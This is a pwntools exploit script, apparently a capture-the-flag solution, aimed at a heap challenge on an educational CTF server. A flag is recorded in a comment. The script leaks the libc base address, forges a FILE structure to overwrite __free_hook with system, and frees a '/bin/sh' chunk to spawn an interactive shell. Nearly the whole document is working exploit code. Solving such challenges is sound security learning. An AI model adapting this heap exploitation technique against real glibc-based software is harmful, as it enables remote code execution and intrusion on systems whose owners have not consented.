from pwn import *
## FLAG{C8763}
def add(idx, name):
    r.sendafter(b'> ',b'1')
    r.sendlineafter(b'> ',str(idx))
    r.sendafter(b'> ',name)


def edit(idx, size, data):
    r.sendafter(b'> ',b'2')
    r.sendlineafter(b'> ',str(idx))
    r.sendlineafter(b'> ',str(size))
    r.send(data)

def delete(idx):
    r.sendafter(b'> ',b'3')
    r.sendlineafter(b'> ',str(idx))

def show():
    r.sendafter(b'> ',b'4')


#r = process('./share/chal')
r = remote('edu-ctf.zoolab.org',10011)
add(0,b'ccccc')
edit(0,0x68,b'c')
add(1,b'c')
delete(0)
edit(1,0x58,b'c')
show()

r.recvuntil(b'data: c')
libc_base = u64(b'\x00' + r.recv(5) + b'\x00\x00') - 0x1ed200
print(hex(libc_base))


free_hook = libc_base + 0x1eee48
system = libc_base + 0x52290

add(0,b'123')
add(2,b'123')
add(3,b'/bin/sh\x00')
edit(2,0x78,b'123')
delete(2)


# #input()
payload = p64(0xfbad208b)
payload += p64(0) * 6
payload += p64(free_hook)
payload += p64(free_hook + 0x3000)
payload += p64(0) * 5
payload += p64(0)
edit(1,0x1d8,payload)
input()
show()

r.send(p64(system)+b'\x00'*0x200)
delete(3)
r.interactive()
